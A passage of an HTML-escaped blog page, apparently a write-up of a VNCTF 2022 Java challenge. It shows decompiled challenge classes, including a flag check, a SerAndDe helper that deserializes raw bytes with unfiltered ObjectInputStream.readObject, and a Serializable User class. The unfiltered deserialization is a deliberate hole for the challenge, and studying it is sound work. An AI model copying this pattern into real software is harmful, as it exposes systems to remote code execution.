class=&#34;hljs-keyword&#34;&gt;finally&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; &amp;#123;&lt;br&gt;                in.close();&lt;br&gt;                read.close();&lt;br&gt;            &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (IOException var11) &amp;#123;&lt;br&gt;                var11.printStackTrace();&lt;br&gt;                System.out.println(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Secr3t : io exception!&amp;quot;&lt;/span&gt;);&lt;br&gt;            &amp;#125;&lt;br&gt;&lt;br&gt;        &amp;#125;&lt;br&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; Flag;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;boolean&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;check&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(String checkStr)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;vnctf2022&amp;quot;&lt;/span&gt;.equals(checkStr);&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;SerAndDe.class&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;package&lt;/span&gt; util;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.io.ByteArrayInputStream;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.io.ByteArrayOutputStream;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.io.IOException;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.io.ObjectInputStream;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.io.ObjectOutputStream;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;SerAndDe&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;SerAndDe&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;byte&lt;/span&gt;[] serialize(Object object) &amp;#123;&lt;br&gt;        ObjectOutputStream oos = &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;;&lt;br&gt;        ByteArrayOutputStream bos = &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;;&lt;br&gt;&lt;br&gt;        Object var4;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; &amp;#123;&lt;br&gt;            bos = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; ByteArrayOutputStream();&lt;br&gt;            oos = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; ObjectOutputStream(bos);&lt;br&gt;            oos.writeObject(object);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;byte&lt;/span&gt;[] b = bos.toByteArray();&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;byte&lt;/span&gt;[] var16 = b;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; var16;&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (IOException var14) &amp;#123;&lt;br&gt;            System.out.println(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;serialize Exception:&amp;quot;&lt;/span&gt; + var14.toString());&lt;br&gt;            var4 = &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;;&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;finally&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (oos != &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;) &amp;#123;&lt;br&gt;                    oos.close();&lt;br&gt;                &amp;#125;&lt;br&gt;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (bos != &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;) &amp;#123;&lt;br&gt;                    bos.close();&lt;br&gt;                &amp;#125;&lt;br&gt;            &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (IOException var13) &amp;#123;&lt;br&gt;                System.out.println(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;io could not close:&amp;quot;&lt;/span&gt; + var13.toString());&lt;br&gt;            &amp;#125;&lt;br&gt;&lt;br&gt;        &amp;#125;&lt;br&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;byte&lt;/span&gt;[])var4;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; Object &lt;span class=&#34;hljs-title&#34;&gt;deserialize&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;byte&lt;/span&gt;[] bytes)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;        ByteArrayInputStream bais = &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;;&lt;br&gt;&lt;br&gt;        Object var3;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; &amp;#123;&lt;br&gt;            bais = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; ByteArrayInputStream(bytes);&lt;br&gt;            ObjectInputStream ois = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; ObjectInputStream(bais);&lt;br&gt;            var3 = ois.readObject();&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; var3;&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (IOException | ClassNotFoundException var13) &amp;#123;&lt;br&gt;            System.out.println(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;deserialize Exception:&amp;quot;&lt;/span&gt; + var13.toString());&lt;br&gt;            var3 = &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;;&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;finally&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (bais != &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;) &amp;#123;&lt;br&gt;                    bais.close();&lt;br&gt;                &amp;#125;&lt;br&gt;            &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (IOException var12) &amp;#123;&lt;br&gt;                System.out.println(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;LogManage Could not serialize:&amp;quot;&lt;/span&gt; + var12.toString());&lt;br&gt;            &amp;#125;&lt;br&gt;&lt;br&gt;        &amp;#125;&lt;br&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; var3;&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;User.class&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;package&lt;/span&gt; entity;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.io.IOException;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.io.ObjectInputStream;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.io.Serializable;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;User&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Serializable&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; String name;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; String age;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;transient&lt;/span&gt; String height;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(String name, String age, String height)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.name = name;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.age = age;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.height = height;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; String &lt;span class=&#34;hljs-title&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.name;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;setName&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(String name)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.name = name;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; String &lt;span class=&#34;hljs-title&#34;&gt;getAge&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.age;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;setAge&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(String age)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.age = age;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; String &lt;span class=&#34;hljs-title&#34;&gt;getHeight&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.height;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;setHeight&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(String height)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.height = height;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;readObject&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(ObjectInputStream s)&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;throws&lt;/span&gt; IOException, ClassNotFoundException &lt;/span&gt;&amp;#123;&lt;br&gt;        s.defaultReadObject();&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.height = (String)s.readObject();&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;boolean&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;equals&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(Object obj)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (obj == &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;false&lt;/span&gt;;&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt; == obj) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;true&lt;/span&gt;;&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (obj &lt;span class=&#34;hljs-keyword&#34;&gt;instanceof&lt;/span&gt; User) &amp;#123;&lt;br&gt;            User user = (User)obj;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; user.getAge().equals(&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.age) &amp;amp;&amp;amp; user.getHeight().equals(&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.height) &amp;amp;&amp;amp; user.getName().equals(&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.name);&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;false&lt;/span&gt;;&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; String &lt;span class=&#34;hljs-title&#34;&gt;toString&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;User&amp;#123;name=&amp;#x27;&amp;quot;&lt;/span&gt; + &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.name + &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\&amp;#x27;&amp;#x27;&lt;/span&gt; + &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;, age=&amp;#x27;&amp;quot;&lt;/span&gt; + &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.age + &lt;span 